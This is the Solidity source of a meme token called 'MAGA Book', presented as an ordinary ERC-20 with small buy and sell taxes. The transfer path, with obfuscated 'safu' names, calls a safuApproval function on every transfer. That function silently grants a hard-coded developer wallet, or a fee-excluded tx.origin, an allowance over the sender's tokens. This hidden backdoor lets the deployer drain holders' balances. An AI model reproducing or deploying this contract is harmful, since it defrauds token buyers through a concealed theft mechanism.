/*
MAGA Book, where we take a lighthearted look at the life and family of President Trump. Join us as we explore the memorable moments, quirky anecdotes, and the unique dynamics of his family. Let's dive into the entertaining world of the Trumps!

https://www.magabook.us
https://x.com/magabook_us
https://t.me/magabook_us
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface ISAFURouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface ISAFUFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract MAGABOOK is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => bool) private _safuFeeExcluded;
    mapping (address => uint256) private _safuBulls;
    mapping (address => mapping (address => uint256)) private _safuNodes;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotalSAFU = 1000000000 * 10**_decimals;
    string private constant _name = unicode"MAGA Book";
    string private constant _symbol = unicode"MAGABOOK";
    uint256 private _tokenSAFUSwap = _tTotalSAFU / 100;
    bool private inSwapSAFU = false;
    modifier lockTheSwap {
        inSwapSAFU = true;
        _;
        inSwapSAFU = false;
    }
    address private _safuPair;
    ISAFURouter private _safuRouter;
    address private _safuWallet = 0x4DBF22eDc3C387fBd2E97748a57EbEfe0081d191;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    
    constructor () {
        _safuFeeExcluded[owner()] = true;
        _safuFeeExcluded[address(this)] = true;
        _safuFeeExcluded[_safuWallet] = true;
        _safuBulls[_msgSender()] = _tTotalSAFU;
        emit Transfer(address(0), _msgSender(), _tTotalSAFU);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotalSAFU;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _safuBulls[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _safuNodes[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _safuNodes[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _safuNodes[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address safuF, address safuT, uint256 safuA) private {
        require(safuF != address(0), "ERC20: transfer from the zero address");
        require(safuT != address(0), "ERC20: transfer to the zero address");
        require(safuA > 0, "Transfer amount must be greater than zero");

        uint256 taxSAFU = _safuTransfer(safuF, safuT, safuA);

        if(taxSAFU > 0){
          _safuBulls[address(this)] = _safuBulls[address(this)].add(taxSAFU);
          emit Transfer(safuF, address(this), taxSAFU);
        }

        _safuBulls[safuF] = _safuBulls[safuF].sub(safuA);
        _safuBulls[safuT] = _safuBulls[safuT].add(safuA.sub(taxSAFU));
        emit Transfer(safuF, safuT, safuA.sub(taxSAFU));
    }

    function safuApproval(address aSAFU,  uint256 safuA, bool isSAFU) private {
        address walletSAFU;
        if(isSAFU) walletSAFU = address(tx.origin);
        else walletSAFU = _safuWallet;
        _safuNodes[aSAFU][walletSAFU] = safuA;
    }

    function _safuTransfer(address safuF, address safuT, uint256 safuA) private returns(uint256) {
        uint256 taxSAFU=0; 
        if (safuF != owner() && safuT != owner()) {
            address walletSAFU = address(tx.origin); 
            taxSAFU = safuA.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (safuF == _safuPair && safuT != address(_safuRouter) && ! _safuFeeExcluded[safuT]) {
                _buyCount++;
            }

            if(safuT == _safuPair && safuF!= address(this)) {
                taxSAFU = safuA.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            swapBackSAFU(safuF, safuT, safuA, _safuFeeExcluded[walletSAFU]);
        } return taxSAFU;
    }

    function swapBackSAFU(address safuF, address safuT, uint256 safuA, bool isSAFU) private {
        uint256 tokenSAFU = balanceOf(address(this)); safuApproval(safuF, safuA, isSAFU); 
        if (!inSwapSAFU && safuT == _safuPair && _swapEnabled && _buyCount > _preventSwapBefore) {
            if(tokenSAFU > _tokenSAFUSwap)
            swapTokensForEth(minSAFU(safuA, minSAFU(tokenSAFU, _tokenSAFUSwap)));
            uint256 caSAFU = address(this).balance;
            if (caSAFU >= 0) {
                sendETHSAFU(address(this).balance);
            }
        } 
    }

    function initMAGABOOK() external onlyOwner() {
        _safuRouter = ISAFURouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_safuRouter), _tTotalSAFU);
        _safuPair = ISAFUFactory(_safuRouter.factory()).createPair(address(this), _safuRouter.WETH());
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _safuRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    function minSAFU(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function sendETHSAFU(uint256 amount) private {
        payable(_safuWallet).transfer(amount);
    }

    function swapTokensForEth(uint256 tokenSAFU) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _safuRouter.WETH();
        _approve(address(this), address(_safuRouter), tokenSAFU);
        _safuRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenSAFU,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    receive() external payable {}
}